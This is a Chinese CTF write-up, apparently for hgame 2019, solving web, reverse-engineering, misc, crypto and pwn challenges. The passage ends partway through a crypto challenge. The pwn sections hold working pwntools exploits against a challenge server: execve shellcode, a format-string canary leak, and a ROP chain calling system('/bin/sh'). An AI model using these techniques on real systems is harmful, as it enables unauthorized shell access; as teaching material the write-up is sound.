<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&#x27;id&#x27;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹&lt;/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;id&#x27;] = urldecode($_GET[&#x27;id&#x27;]);</span><br><span class="line">if($_GET[&#x27;id&#x27;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<p>意思是要提交一个 get 类型的参数 id，并且不能包含字符串 vidar，但是在 urldecode 之后是 vidar。<br>非常简单，我们将 vidar url编码两次，原因是服务器接受到参数之后会自动解码一次，然后代码中再解码一次。  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576%2569%2564%2561%2572</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{urlDecode_Is_GoOd}</p>
<h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>F12 找到另一个页面 f12.php，之后需要我们 post 一个密码，密码就在返回包的头部</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">password: woyaoflag</span><br></pre></td></tr></table></figure></div>
<p>然后给出了一个链接，点进去说太快了，那么抓包再发送。</p>
<p>flag: hgame{f12_1s_aMazIng111}</p>
<h2 id="brainfxxker"><a href="#brainfxxker" class="headerlink" title="brainfxxker"></a>brainfxxker</h2><p>题目直接给了源代码，其实就是实现了一个 brainfuck 解释器，有关于 brainfuck 的语法在网上有很多。<br>分析给出的那段 brainfuck 代码就可以了，由于 “,” 是输入，所以把整个程序分成 9 段，每一段代表 flag 中的一个字符，通过上面的提示，使程序不输出任何内容的输入为正确的 flag，以第一段代码为例</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.]</span><br><span class="line"></span><br><span class="line">,     输入</span><br><span class="line">&gt;     指针后移</span><br><span class="line">++++++++++  循环变量设置为 10</span><br><span class="line">loop:</span><br><span class="line">    [       开始循环</span><br><span class="line">    &lt;       指针左移一位(指向输入的字符)</span><br><span class="line">    ----------  输入的字符自减 10</span><br><span class="line">    &gt;       指针右移一位(指向循环变量)</span><br><span class="line">    -       循环变量自减 1</span><br><span class="line">    ]       判断是否结束</span><br><span class="line">&lt;     指针左移，指向输入的字符</span><br><span class="line">++    自增 2</span><br><span class="line">loop:  (要求这个循环不能执行)</span><br><span class="line">    [       开始循环</span><br><span class="line">    +       自增 1</span><br><span class="line">    .       输出字符       </span><br><span class="line">    ]       结束循环       </span><br><span class="line">逻辑： 输入一个字符，减去 100 再加 2, 最后要求等于零</span><br><span class="line">x - 100 + 2 == 0 --&gt; 98 --&gt; b</span><br></pre></td></tr></table></figure></div>
<p>每一段代码相当于实现了一个上面的方程，将 9 段代码全部分析出来之后即可得到 flag。  </p>
<p>flag: hgame{bR4!NfUcK}</p>
<h2 id="HelloRe"><a href="#HelloRe" class="headerlink" title="HelloRe"></a>HelloRe</h2><p>IDA 打开找到 flag。</p>
<p>flag: hgame{Welc0m3_t0_R3_World!}</p>
<h2 id="わかります"><a href="#わかります" class="headerlink" title="わかります"></a>わかります</h2><p>这道题稍微有点费劲，关键代码如下<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-2.png"
                      alt="image"
                > </p>
<p>关键函数是中间的 sub_40078E 和 sub_400892。<br>本程序的基本逻辑是先将输入的 flag 进行两次不同的编码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ( i = 0; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk1[i] = (flag[i] &gt;&gt; 4);</span><br><span class="line">    chunk2[i] = flag[i] &amp; 0xF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>分别保存在两个局部变量中，接着进入关键函数，第一个函数实现的是两个矩阵相乘，结果保存在 v8 中，第二个函数实现的是矩阵相加，由于两个矩阵都是 6 阶方阵，所以运算也相对简单，根据下面的方程</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enc_flag * token = dword_602120</span><br><span class="line"></span><br><span class="line">enc_flag + token = dword_6021c0</span><br></pre></td></tr></table></figure></div>
<p>现在 token 和最终的运算结果都已知，那么 flag 矩阵是可以求出的，求矩阵的方法有很多，我采取 Z3 进行约束求解</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">target1 = [122, 207, 140, 149, 142, 168, </span><br><span class="line">           95,  201, 122, 145, 136, 167, </span><br><span class="line">           112, 192, 127, 137, 134, 147, </span><br><span class="line">           95, 207, 110, 134, 133, 173, </span><br><span class="line">           136, 212, 160, 162, 152, 179, </span><br><span class="line">           121, 193, 126, 126, 119, 147]</span><br><span class="line"></span><br><span class="line">token = [8, 1, 7, 1, 1, 0, </span><br><span class="line">         4, 8, 1, 2, 3, 9, </span><br><span class="line">         3, 8, 6, 6, 4, 8, </span><br><span class="line">         3, 5, 7, 8, 8, 7, </span><br><span class="line">         0, 9, 0, 2, 3, 4, </span><br><span class="line">         2, 3, 2, 5, 4, 0]</span><br><span class="line"></span><br><span class="line">target2 = [16, 8, 8, 14, 6, 11, </span><br><span class="line">           5, 23, 5, 10, 12, 23, </span><br><span class="line">		   14, 23, 19, 7, 8, 10, </span><br><span class="line">		   4, 13, 22, 17, 11, 22, </span><br><span class="line">		   6, 14, 2, 11, 18, 9, </span><br><span class="line">		   5, 8, 8, 10, 16, 13]</span><br><span class="line"></span><br><span class="line">chunk2 = [8, 7, 1, 13, 5, 11, 1, 15, 4, 8, 9, 14, 11, 15, 13, 1, 4, 2, 1, 8, 15, 9, 3, 15, 6, 5, 2, 9, 15, 5, 3, 5, 6, 5, 12, 13]</span><br><span class="line"></span><br><span class="line">a = BitVec(&#x27;a&#x27;, 8)</span><br><span class="line">b = BitVec(&#x27;b&#x27;, 8)</span><br><span class="line">c = BitVec(&#x27;c&#x27;, 8)</span><br><span class="line">d = BitVec(&#x27;d&#x27;, 8)</span><br><span class="line">e = BitVec(&#x27;e&#x27;, 8)</span><br><span class="line">f = BitVec(&#x27;f&#x27;, 8)</span><br><span class="line"></span><br><span class="line">j = 0</span><br><span class="line">k = 0</span><br><span class="line">p = 0</span><br><span class="line">for q in range(6):</span><br><span class="line">    solve((a &gt;&gt; 4) * token[k] + (b &gt;&gt; 4) * token[k + 6] + (c &gt;&gt; 4) * token[k + 12] + (d &gt;&gt; 4) * token[k + 18] + (e &gt;&gt; 4) * token[k + 24] + (f &gt;&gt; 4) * token[k + 30] == target1[j],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 1] + (b &gt;&gt; 4) * token[k + 6 + 1] + (c &gt;&gt; 4) * token[k + 12 + 1] + (d &gt;&gt; 4) * token[k + 18 + 1] + (e &gt;&gt; 4) * token[k + 24 + 1] + (f &gt;&gt; 4) * token[k + 30 + 1] == target1[j + 1],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 2] + (b &gt;&gt; 4) * token[k + 6 + 2] + (c &gt;&gt; 4) * token[k + 12 + 2] + (d &gt;&gt; 4) * token[k + 18 + 2] + (e &gt;&gt; 4) * token[k + 24 + 2] + (f &gt;&gt; 4) * token[k + 30 + 2] == target1[j + 2],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 3] + (b &gt;&gt; 4) * token[k + 6 + 3] + (c &gt;&gt; 4) * token[k + 12 + 3] + (d &gt;&gt; 4) * token[k + 18 + 3] + (e &gt;&gt; 4) * token[k + 24 + 3] + (f &gt;&gt; 4) * token[k + 30 + 3] == target1[j + 3],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 4] + (b &gt;&gt; 4) * token[k + 6 + 4] + (c &gt;&gt; 4) * token[k + 12 + 4] + (d &gt;&gt; 4) * token[k + 18 + 4] + (e &gt;&gt; 4) * token[k + 24 + 4] + (f &gt;&gt; 4) * token[k + 30 + 4] == target1[j + 4],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 5] + (b &gt;&gt; 4) * token[k + 6 + 5] + (c &gt;&gt; 4) * token[k + 12 + 5] + (d &gt;&gt; 4) * token[k + 18 + 5] + (e &gt;&gt; 4) * token[k + 24 + 5] + (f &gt;&gt; 4) * token[k + 30 + 5] == target1[j + 5],</span><br><span class="line">a &amp; 0xf == chunk2[p], b &amp; 0xf == chunk2[p + 1], c &amp; 0xf == chunk2[p + 2], d &amp; 0xf == chunk2[p + 3], e &amp; 0xf == chunk2[p + 4], f &amp; 0xf == chunk2[p + 5])</span><br><span class="line">    j += 6</span><br><span class="line">    p += 6</span><br><span class="line"></span><br><span class="line">#[f = 123, b = 103, a = 104, c = 97, d = 109, e = 101]</span><br><span class="line">#[f = 110, b = 95, a = 49, c = 116, d = 104, e = 105]</span><br><span class="line">#[f = 114, b = 95, a = 107, c = 77, d = 97, e = 116]</span><br><span class="line">#[f = 95, b = 120, a = 49, c = 95, d = 105, e = 115]</span><br><span class="line">#[f = 117, b = 101, a = 118, c = 114, d = 121, e = 95]</span><br><span class="line">#[f = 125, b = 101, a = 115, c = 102, d = 53, e = 108]</span><br><span class="line"></span><br><span class="line">#hgame&#123;1_think_Matr1x_is_very_usef5l&#125;</span><br><span class="line"></span><br><span class="line">flag = [104,103,97,109,101,123,49,95,116,104,105,110,107,95,77,97,116,114,49,120,95,105,115,95,118,101,114,121,95,117,115,101,102,53,108,125]</span><br><span class="line"></span><br><span class="line">qwer = &quot;&quot;</span><br><span class="line">for q in flag:</span><br><span class="line">    qwer += chr(q)</span><br><span class="line">print(qwer)</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{1_think_Matr1x_is_very_usef5l}</p>
<h2 id="r-amp-xor"><a href="#r-amp-xor" class="headerlink" title="r &amp; xor"></a>r &amp; xor</h2><p>简单的异或加密，需要注意一点，由于 IDA 的解析问题，有一部分 token 不能显示出来，需要动态调试得到。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &quot;hgame&#123;Y0u_mayb3_need_th1s_0ne!!!!!&#125;&quot;</span><br><span class="line">d = [0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,0,66,85,126,72,85,30,0,0]</span><br><span class="line">t = &quot;&quot;</span><br><span class="line">for i in range(35):</span><br><span class="line">    t += chr(ord(s[i]) ^ d[i])</span><br><span class="line">print(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{X0r_1s_interest1ng_isn’t_it?}</p>
<h2 id="Pro的Python教室-一"><a href="#Pro的Python教室-一" class="headerlink" title="Pro的Python教室(一)"></a>Pro的Python教室(一)</h2><p>把代码中的 enc2 BASE64 解密即可。  </p>
<p>flag: hgame{Here_1s_3asy_Pyth0n}</p>
<h2 id="babysc"><a href="#babysc" class="headerlink" title="babysc"></a>babysc</h2><p>主函数代码不能正常 F5，提示有一处 call 分析失败，将它 nop 掉之后再 F5 ，得到如下伪代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[92]; // [rsp+0h] [rbp-60h]</span><br><span class="line">  int i; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  signal(14, (__sighandler_t)handle);</span><br><span class="line">  alarm(0xAu);</span><br><span class="line">  read(0, buf, 80uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 79; ++i )</span><br><span class="line">    buf[i] ^= i + 1;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>大概的意思就是把输入进行异或加密，最后的 call 应该是跳转到用户的输入继续执行。<br>先把输入的 shellcode 异或就行。  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">binary = &quot;./babysc&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10000</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">new_shellcode = &quot;&quot;</span><br><span class="line">for i in range(len(shellcode)):</span><br><span class="line">    new_shellcode += chr(ord(shellcode[i]) ^ (i + 1))</span><br><span class="line">print(new_shellcode)</span><br><span class="line">p.sendline(new_shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{Baby_Baby_S0_E4ay!}</p>
<h2 id="aaaaaaaaaa"><a href="#aaaaaaaaaa" class="headerlink" title="aaaaaaaaaa"></a>aaaaaaaaaa</h2><p>连上去输入 100 个 a 就可以了。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./babysc&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  9999</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;a&quot; * 100)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>flag: hgame{Aa4_4aA_4a4aAAA}</p>
<h2 id="薯片拯救世界1"><a href="#薯片拯救世界1" class="headerlink" title="薯片拯救世界1"></a>薯片拯救世界1</h2><p>除了那些花里胡哨的东西之外，逻辑就是先把 flag 读取到一个全局变量里面，然后进入一个循环，要求我们输入 flag，并且使用 strncmp 函数和 flag 比较。<br>由于比较的字节数是由 strlen 确定的，可以通过控制输入长度来爆破 flag。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./CSTW&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10001</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line"># context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Ch1p Save The World--Chapter 1\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;...\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;魔王的封印在2000年后的今天终于被解开\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;人类又到了生死存亡的最后关头\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;——Ch1p\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">flag = &quot;hgame&#123;Ch1p_1s_&quot;</span><br><span class="line">token = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#125;&quot;</span><br><span class="line">for i in range(len(token)):</span><br><span class="line">    flag += token[i]</span><br><span class="line">    print(&quot;Trying: %s&quot; % flag)</span><br><span class="line">    p.recvuntil(&quot;为此，大祭司必须念出当年约定的那串咒语——\n&quot;)</span><br><span class="line">    p.send(flag + &quot;\x00&quot;)</span><br><span class="line">    result = p.recv(6)</span><br><span class="line">    if &quot;......&quot; in result:</span><br><span class="line">        flag = &quot;hgame&#123;Ch1p_1s_&quot;</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;FOUND : %s&quot; % flag)</span><br><span class="line">        break</span><br><span class="line"># p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{Ch1p_1s_Awakking!}</p>
<h2 id="Steins-Gate"><a href="#Steins-Gate" class="headerlink" title="Steins;Gate"></a>Steins;Gate</h2><p>这道题考察的东西比较多，类似闯关一样分成四关，第一关代码如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_4008F6()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-40h]</span><br><span class="line">  int v2; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;To seek the truth of the world.&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x80uLL);</span><br><span class="line">  if ( v2 != 9011 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>要求 v2 &#x3D;&#x3D; 9011，通过上面的 read 栈溢出控制 v2，但是不能直接控制返回地址，因为程序开启了 canary。<br>第二关代码：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_400958()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST0C_4</span><br><span class="line">  char buf; // [rsp+10h] [rbp-40h]</span><br><span class="line">  char v3; // [rsp+14h] [rbp-3Ch]</span><br><span class="line">  int v4; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v0 = v4;</span><br><span class="line">  puts(&quot;Repeater is nature of man.&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  puts(&quot;You found it?&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x34uLL);</span><br><span class="line">  if ( v4 - 4660 != v0 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>通过格式化字符串漏洞泄露出 rand 出的数值，然后栈溢出控制 v4 满足要求。<br>第三关：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_400A00()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-24h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-20h]</span><br><span class="line">  char v3; // [rsp+15h] [rbp-1Bh]</span><br><span class="line">  unsigned __int64 v4; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Payment of past debts.&quot;);</span><br><span class="line">  read(0, &amp;buf, 5uLL);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  if ( v1 != 26214 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里通过动态调试发现，v1 的值正好在上一关中 buf 的范围内，所以在上一关就构造好 payload 满足这里的条件，之后利用 5 字节的格式化字符串漏洞泄露 canary。<br>最后一关和第一关一样，不同的是已经拿到了 canary，构造满足条件的 payload 然后栈溢出即可。<br>程序中有 system 函数</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_400A76(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  return system(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>只需要找一个 pop rdi, ret 的 gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./SteinsGate&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10002</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;What&#x27;s your ID:&quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;To seek the truth of the world.\n&quot;)</span><br><span class="line">payload1 = &quot;a&quot; * 0x30 + p64(0x2333)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(&quot;Repeater is nature of man.\n&quot;)</span><br><span class="line">payload2 = &quot;%7$p&quot;</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(payload2)</span><br><span class="line">rand = int(p.recv(17),16) &gt;&gt; 28</span><br><span class="line">log.info(&quot;Rand : %x&quot; % rand)</span><br><span class="line">p.recvuntil(&quot;You found it?\n&quot;)</span><br><span class="line">payload3 = &quot;aaaaaaaabbbbbbbbccccccccddddff\x00\x00eeeeeeeeffffffff&quot; + p32(rand + 0x1234)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(&quot;Payment of past debts.\n&quot;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(&quot;%11$p&quot;)</span><br><span class="line">canary = int(p.recv(18),16)</span><br><span class="line">payload4 = &quot;a&quot; * 0x30 + p64(0x2333) + p64(canary) + &quot;b&quot; * 8 + p64(0x0000000000400c73) + p64(0x602040) + p64(0x400a76)</span><br><span class="line">p.recvuntil(&quot;To seek the truth of the world.\n&quot;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{El_PsY_C0NgrOO}</p>
<h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><p>简单的 LSB 隐写，用 stegsolve 打开就可以看到 flag。</p>
<p>flag: hgame{LSB_is_easy_for_u}</p>
<h2 id="打字机"><a href="#打字机" class="headerlink" title="打字机"></a>打字机</h2><p>给出了两张图片<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-3.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-4.png"
                      alt="image"
                ></p>
<p>第一张看上去像某种打字机，然后打出了 flag，谷歌识图之后发现这个打字机是某部动画片里的？<br>在知乎上找到一篇<a class="link"   href="https://www.zhihu.com/question/266139542/answer/303595744" >文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-5.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-6.png"
                      alt="image"
                ></p>
<p>通过这两张图片慢慢看(猜)就能看(猜)出 flag。(打字机上印的是大写，而 flag 中有小写字母…)</p>
<p>flag: hgame{My_vi0let_tyPewRiter}</p>
<h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><p>压缩包题目，不能正常解压，用 010 editor 打开看到压缩包头部的 PK 变成了 OK，改回来之后再解压(密码在 winrar 右面的注释栏里面 S0mETh1ng_U5efuL)，即可得到 flag。</p>
<p>flag: hgame{Cra2y_D1aM0nd}</p>
<h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>首先分析流量包，从里面提取出一个压缩包 dec.zip，解压后是另外一个带有密码的压缩包和 password.txt，提示密码是 hgame 后面跟着 8 个不知道是什么的字符。<br>猜测是 8 位数字，用 ZIP 密码破解工具的掩码模式破解出密码 hgame25839421<br>出来一张图片，binwalk 还可以从图片提取出来另一个压缩包，直接解压需要密码，使用 winrar 修复压缩包之后就可以正常解压了，最后得到一个 word 文档，将后缀名改成 zip 解压出来一堆文件，在 word 文件夹下的 document.xml 中找到 flag。  </p>
<p>flag: hgame{59d28413e36019861498e823f3f41406}</p>
<h2 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h2><p>摩斯密码 –&gt; 十六进制转字符串 –&gt; 栅栏密码解密 –&gt; 凯撒密码解密</p>
<p>flag: hgame{E4sY_cRypt0}</p>
<h2 id="perfect-secrecy"><a href="#perfect-secrecy" class="headerlink" title="perfect_secrecy!"></a>perfect_secrecy!</h2><p>提示 OTP 密码，即一次性密码本，银行的一些动态口令使用的就是 OTP 加密。<br>给出的脚本如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def strxor(a, b):</span><br><span class="line">    return &quot;&quot;.join(hex(x ^ y)[2:].zfill(2) for (x, y) in zip(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fp = open(&#x27;poem.txt&#x27;, &#x27;rb&#x27;)</span><br><span class="line">flag = &quot;*********************************&quot;</span><br><span class="line">strings = fp.readlines()</span><br><span class="line">key = hex(random.randint(2**511, 2**512))[2:]    # 从 2^511 到 2^512 取随机数   OTP 密钥</span><br><span class="line">strs = [strxor(i[:-3], binascii.unhexlify(key)) for i in strings]</span><br><span class="line">result = strxor(flag.encode(&#x27;utf-8&#x27;), binascii.unhexlify(key))</span><br><span class="line">print(strs)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">output:</span><br><span class="line">[&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span><br><span class="line">&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span><br><span class="line">&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span><br><span class="line">&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span><br><span class="line">&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span><br><span class="line">&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span><br><span class="line">&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span><br><span class="line">&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span><br><span class="line">&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span><br><span class="line">&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span><br><span class="line">&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span><br><span 